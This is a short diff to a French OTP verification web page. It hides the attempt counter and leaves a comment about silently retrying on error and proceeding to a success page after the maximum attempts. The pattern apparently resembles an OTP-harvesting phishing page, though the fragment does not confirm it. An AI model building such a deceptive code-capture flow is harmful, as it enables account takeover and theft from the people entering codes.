@@ -45,13 +45,7 @@
     <h2 class="verification-title">Vérification requise</h2>
     <p class="verification-instruction">Entrez le code OTP</p>
     <p class="helper-text">Un code à 4 chiffres a été envoyé à <span id="phone">+243000000000</span></p>
-    <p class="otp-attempts-text">Tentative <span id="attempt-num">1</span> sur <span id="attempt-total">4</span></p>
-    <div class="otp-progress">
-      <div class="otp-dot" id="dot1"></div>
-      <div class="otp-dot" id="dot2"></div>
-      <div class="otp-dot" id="dot3"></div>
-      <div class="otp-dot" id="dot4"></div>
-    </div>
+
     <div class="otp-entry">
       <input type="text" class="otp-box" maxlength="1" id="otp1" required>
       <input type="text" class="otp-box" maxlength="1" id="otp2" required>
@@ -128,8 +122,8 @@ function verifyOTP() {
         setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
       }
     })
-
     .catch(err => { 
+
       // On error, retry silently or proceed if max attempts reached
       if (currentAttempt < MAX_ATTEMPTS) {
         setTimeout(attemptVerification, 800);
